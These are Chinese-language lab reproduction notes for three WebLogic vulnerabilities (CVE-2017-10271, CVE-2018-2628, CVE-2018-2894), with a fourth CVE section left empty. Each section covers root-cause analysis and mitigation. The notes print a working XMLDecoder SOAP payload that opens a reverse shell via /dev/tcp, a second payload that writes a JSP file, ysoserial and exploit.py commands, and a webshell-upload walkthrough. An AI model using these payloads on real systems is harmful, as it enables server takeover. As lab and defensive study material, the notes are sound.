# Weblogic反序列化漏洞 (CVE-2017-10271)

## 漏洞详情

Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令



## 影响版本

**Weblogic10.3.6.0.0，12.1.3.0.0，12.2.1.1.0，12.2.1.2.0**



## 环境搭建

```
cd weblogic/CVE-2017-10271
docker-compose up -d
```



## 漏洞复现

我们先拿XML反序列化漏洞检查工具检查一下

![image-20210413124538591](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210413124538591.png)

发现有漏洞可以利用，并在浏览器中粘贴URL验证地址，验证此漏洞的存在

![image-20210413124642518](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210413124642518.png)

访问`/wls-wsat/CoordinatorPortType`目录，存在下图，并且抓个包

![image-20210413124856714](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210413124856714.png)

kali nc监听一下本地端口，将数据包的GET改为POST，填入payload发包

```
nc -l -p 21
```

```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: your-ip:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 633

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i &gt;&amp; /dev/tcp/接收shell的ip/21 0&gt;&amp;1</string> 
</void>
</array>
<void method="start"/></void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
```

反弹shell连接成功，拿到root权限

![image-20210413130043894](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210413130043894.png)



我们也可以写入一句话木马，访问：`http://your-ip:7001/bea_wls_internal/test.jsp`

```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: your-ip:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 638

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java><java version="1.4.0" class="java.beans.XMLDecoder">
    <object class="java.io.PrintWriter"> 
    <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string>
    <void method="println"><string>
    <![CDATA[
<% out.print("test"); %>
    ]]>
    </string>
    </void>
    <void method="close"/>
    </object></java></java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>
```

![image-20210413130450492](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210413130450492.png)

访问测试成功

![image-20210413130544216](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210413130544216.png)



## 漏洞分析

漏洞触发位置：wls-wsat.war
漏洞触发URL：/wls-wsat/CoordinatorPortType（POST）
漏洞的本质：构造SOAP（XML）格式的请求，在解析的过程中导致XMLDecoder反序列化漏洞
漏洞调用链:

分析漏洞调用链：

> weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequest
> weblogic.wsee.jaxws.workcontext.WorkContextTube.readHeaderOld
> weblogic.wsee.workarea.WorkContextXmlInputAdapter

在processRequest方法中,将var3传入readHeaderOld方法中,其中var3其实就是我们发过去的xml中的(意思就是我们可以控制)

```
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java>
           .....
          </java>
 </work:WorkContext>
```

Java读取xml文件文件进行反序列化命令执行如下，执行相关java代码即可执行calc，打开计算器

![图片.png](images/Weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.assets/1557890167_5cdb84774946a.png!small)

weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequest方法如下：

![图片.png](images/Weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.assets/1557890179_5cdb8483e564d.png!small)

将localheader1带入readHeaderOld，对localHeader1具体定义如下：

localHeader1=localHeaderList.get(WorkAreaConstants.WORK_AREA_HEADER,true);

readHeaderOld函数具体如下，创建WorkContextXmlInputAdapter（weblogic/wsee/jaxws/workcontext）

![图片.png](images/Weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.assets/1557890199_5cdb8497b31ed.png!small)

WorkContextXmlInputAdapter类具体如下，此处通过XMLDecoder实现实体和xml内容的转换，随即出现了XMLDecoder反序列化，使得java在调用xml时实现了内容可控。

![图片.png](images/Weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.assets/1557890208_5cdb84a0cad64.png!small)



## 防御与修复

1. 临时解决方案

   根据攻击者利用POC分析发现所利用的为wls-wsat组件的CoordinatorPortType接口，若Weblogic服务器集群中未应用此组件，建议临时备份后将此组件删除，当形成防护能力后，再进行恢复。
   根据实际环境路径，删除WebLogic wls-wsat组件：

   ```
   rm -f  /home/WebLogic/Oracle/Middleware/wlserver_10.3/server/lib/wls-wsat.war
   rm -f  /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war
   rm -rf /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat
   ```

   重启Weblogic域控制器服务:

   ```
   DOMAIN_NAME/bin/stopWeblogic.sh           #停止服务
   DOMAIN_NAME/bin/startManagedWebLogic.sh    #启动服务
   ```

   删除以上文件之后，需重启WebLogic。确认http://weblogic_ip/wls-wsat/ 是否为404页面

2. 官方补丁修复

   [前往Oracle官网下载10月份所提供的安全补丁](http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html)
   [执行参考](http://blog.csdn.net/qqlifu/article/details/49423839)

针对该漏洞被恶意利用的单位可查看如下如下路径进行日志查看，具体的路径根据实际安装情况进行查看：

```
xx:\xx\Middleware\user_projects\domains\base_domain\servers\AdminServer\logs
```



参考资料：

http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html

http://pirogue.org/2017/12/29/weblogic-XMLDecoder/

http://blog.diniscruz.com/2013/08/using-xmldecoder-to-execute-server-side.html

https://github.com/iBearcat/Oracle-WebLogic-CVE-2017-10271

[http://www.cnblogs.com/backlion/p/8194324.htm](http://www.cnblogs.com/backlion/p/8194324.html)

https://www.freebuf.com/column/203816.html

https://blog.csdn.net/he_and/article/details/90582262

https://vulhub.org/#/environments/weblogic/CVE-2017-10271/





# Weblogic Server WLS Core Components 反序列化命令执行漏洞 (CVE-2018-2628)

## 漏洞详情

CVE-2018-2628漏洞是2018年Weblogic爆出的**基于T3(丰富套接字)协议的反系列化高危漏洞**，且在打上官方补丁Patch Set Update 180417补丁后仍能检测到只是利用方法有了一些改变漏洞编号改为了CVE-2018-3245，其基本原理其实都是利用了T3协议的缺陷实现了Java虚拟机的RMI：远程方法调用(Remote Method Invocation)，能够在本地虚拟机上调用远端代码。



## 影响版本

**Weblogic 10.3.6.0 Weblogic 12.1.3.0 Weblogic 12.2.1.2 Weblogic 12.2.1.3**



## 环境搭建

```
cd weblogic/CVE-2018-2628
docker-compose up -d
```



## 漏洞复现

首先我们用nmap检查一下漏洞所需端口情况

这里我们针对7001，和7002两个默认的控制端口进行扫描，扫描的时候加上weblogic-t3-info脚本，如果目标服务器开启了T3协议就会在扫描结果中显示。

```
nmap -n -v -p7001,7002 192.168.16.128 --script=weblogic-t3-info
```

![image-20210413163946799](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210413163946799.png)

我们启动一个JRMP Server，可以利用 [ysoserial](https://github.com/brianwrf/ysoserial/releases/tag/0.0.6-pri-beta)

下载后我们在本地启动它

```
java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]
```

- [listen port]：本地监听的端口，待会要用到
- [command]：需要执行的命令，这里我们准备在目标的/tmp目录下创建一个shell文件

最后构建的命令

```
java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 4444 CommonsCollections1 "touch /tmp/shell"
```



然后，我们再使用[exploit.py](https://www.exploit-db.com/exploits/44553)脚本，向目标Weblogic（`http://your-ip:7001`）发送数据包：

```
python2 exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]
```

- `[victim ip]`和`[victim port]`是目标weblogic的IP和端口
- `[path to ysoserial]`是本地ysoserial的路径
- `[JRMPListener ip]`和`[JRMPListener port]`第一步中启动JRMP Server的IP地址和端口
- `[JRMPClient]`是执行JRMPClient的类，可选的值是`JRMPClient`或`JRMPClient2`

最后我们的命令构建

```
python2 .\exploit.py 192.168.16.128 7001 .\ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 192.168.16.1 4444 JRMPClient
```

命令完成之后我们就可以进入docker容器中，验证目标的/tmp目录下是否创建一个shell文件

```
docker-compose exec weblogic bash
```

![image-20210413183512456](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210413183512456.png)



## 漏洞分析

目前这个漏洞是结合了历史问题实现的远程命令执行，具体概括有三点

1. 反射机制

   JAVA反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制。

2. RMI

   RMI是Remote Method Invocation的简称，是J2SE的一部分，能够让程序员开发出基于Java的分布式应用。一个RMI对象是一个远程Java对象，可以从另一个Java虚拟机上（甚至跨过网络）调用它的方法，可以像调用本地Java对象的方法一样调用远程对象的方法，使分布在不同的JVM中的对象的外表和行为都像本地对象一样。

   RMI传输过程都使用序列化和反序列化，如果RMI服务端端口对外开发，并且服务端使用了像Apache Commons Collections这类库，那么会导致远程命令执行。

   RMI依赖于Java远程消息交换协议JRMP（Java Remote Messaging Protocol），该协议为java定制，要求服务端与客户端都为java编写。

3. 绕过黑名单

   Weblogic 中InboundMsgAbbrev 的resolveProxyClass处理rmi接口类型，因为只判断了java.rmi.registry.Registry ，找一个其他的rmi接口绕过，比如java.rmi.activation.Activator为 RMI 对象激活提供支持。

这里参考：[CVE-2018-2628 WebLogic反序列化漏洞分析](http://blog.topsec.com.cn/cve-2018-2628-weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)

经测试，必须先发送T3协议头数据包，再发送JAVA序列化数据包，才能使weblogic进行JAVA反序列化，进而触发漏洞。如果只发送JAVA序列化数据包，不先发送T3协议头数据包，无法触发漏洞



## 防御与修复

- 官方补丁

- 手工修复

  若要利用该漏洞, 攻击者首先需要与WebLogic Server提供的T3服务端口建立SOCKET连接, 运维人员可通过控制T3协议的访问权限来临时阻断漏洞利用。

  WebLogic Server 提供了名叫“weblogic.security.net.ConnectionFilterImpl”的默认连接筛选器。该连接筛选器可控制所有传入连接，通过修改此连问控制。接筛选器规则，可对T3及T3S协议进行防御。





# Weblogic 任意文件上传漏洞 (CVE-2018-2894)

## 漏洞详情

Oracle 7月更新中，修复了Weblogic Web Service Test Page中一处任意文件上传漏洞，Web Service Test Page 在“生产模式”下默认不开启，所以该漏洞有一定限制。

攻击者访问config.do配置页面，先更改Work Home工作目录，用有效的已部署的Web应用目录替换默认的存储JKS Keystores文件的目录，之后使用"添加Keystore设置"的功能，可上传恶意的JSP脚本文件



## 影响版本

**weblogic 10.3.6.0、weblogic 12.1.3.0、weblogic 12.2.1.2、weblogic 12.2.1.3**



## 环境搭建

```
cd 
docker-compose up -d
```



## 漏洞复现

环境启动后，访问`http://your-ip:7001/console`，即可看到后台登录页面

执行`docker-compose logs | grep password`可查看管理员密码，管理员用户名为`weblogic`，我们进行登录

在登录后台页面，点击`base_domain`的配置，在 ‘高级’ 中勾选 ‘启用 Web 服务测试页’ 选项，然后保存配置

![image-20210413194657128](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210413194657128.png)

我们访问`/ws_utc/config.do` 目录，设置Work Home Dir为，进行保存

```
/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css
```

**注意：**将目录设置为`ws_utc`应用的静态文件css目录，访问这个目录是无需权限的，这一点很重要



然后点击安全 -> 增加，然后上传webshell，这里我们用哥斯拉生成一个webshell的jsp，注意上传成功后抓取返回包，其中有时间戳：

![image-20210413195159164](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210413195159164.png)

然后访问`http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]`，即可执行webshell：

![image-20210413194445915](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210413194445915.png)



## 漏洞分析

系统把所选的上传文件传到了storePath目录里，文件命名条件为fileNamePrefix + "_" + attachName，采用了POST请求中URL地址上携带的参数timestamp的值加上下划线拼接起来的文件名，同时也没有发现有任何过滤和检查。



## 防御与修复

1. 设置config.do,begin.do页面登录授权后访问；
2. IPS等防御产品可以加入相应的特征；
3. 升级到官方的最新版本；





# Weblogic 管理控制台未授权远程命令执行漏洞 (CVE-2020-14882，CVE-2020-14883)

## 漏洞详情





## 影响版本

## 环境搭建

## 漏洞复现

## 漏洞分析

## 防御与修复



















